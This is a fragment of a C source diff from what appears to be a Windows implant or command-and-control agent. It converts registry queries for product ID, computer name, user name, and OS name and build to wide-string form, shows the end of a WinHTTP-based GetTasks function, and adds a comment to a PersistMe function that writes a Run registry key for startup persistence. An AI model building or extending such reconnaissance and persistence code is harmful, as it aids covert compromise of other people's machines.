@@ -57,7 +57,7 @@ void RunningProcesses(){
 wchar_t* ProductID(){
     wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
 	DWORD size = 30*sizeof(wchar_t);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), TEXT("ProductId"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
     return value;
 }
 
@@ -65,7 +65,7 @@ wchar_t* ProductID(){
 wchar_t* ComputerName(){
     wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName"), TEXT("ComputerName"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
 	return value;
 }
 
@@ -73,7 +73,7 @@ wchar_t* ComputerName(){
 wchar_t* CurrentUser(){
     wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
+	RegGetValue(HKEY_CURRENT_USER, TEXT("Volatile Environment"), TEXT("USERNAME"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
 	return value;
 }
 
@@ -81,7 +81,7 @@ wchar_t* CurrentUser(){
 wchar_t* OSName(){
     wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
     DWORD size = 30*sizeof(char);
-    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
+    RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), TEXT("ProductName"), RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
     return name;
 }
 
@@ -89,7 +89,7 @@ wchar_t* OSName(){
 wchar_t* OSVersion(){
     wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
 	DWORD size = 30*sizeof(char);
-	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
+	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), TEXT("CurrentBuild"), RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
     return build;
 }
 
@@ -258,6 +258,7 @@ wchar_t* GetTasks(){
     WinHttpCloseHandle(session);
 }
 
+// Add registry run key for local user to boot this executable at startup
 void PersistMe(){
     HKEY key;
     RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
